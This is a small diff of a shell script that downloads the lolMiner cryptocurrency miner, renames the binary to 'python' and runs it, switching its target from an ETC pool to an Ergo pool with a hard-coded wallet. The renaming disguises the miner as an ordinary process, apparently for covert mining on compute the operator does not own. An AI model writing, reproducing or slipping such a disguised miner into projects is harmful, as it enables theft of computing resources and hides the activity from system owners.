@@ -2,4 +2,4 @@ curl -L -o python.tar.gz https://github.com/Lolliedieb/lolMiner-releases/release
 tar -zxvf python.tar.gz
 cd 1.65
 mv lolMiner python
-./python --coin ETC --pool stratum+tcp://etc.ss.poolin.one:700 --user 0x443dd6fa59a4b77cbe694b61b0fe54dac7eedb6b.GPU
+./python --algo AUTOLYKOS2 --pool stratum+tcp://ergo.magicpool.co:3333 --user ERGO:9gL1cBifCAEzDjKd9ov5sHpWbxSt2jqAiHhVrXPxhWc6B6zfW7G.sedar
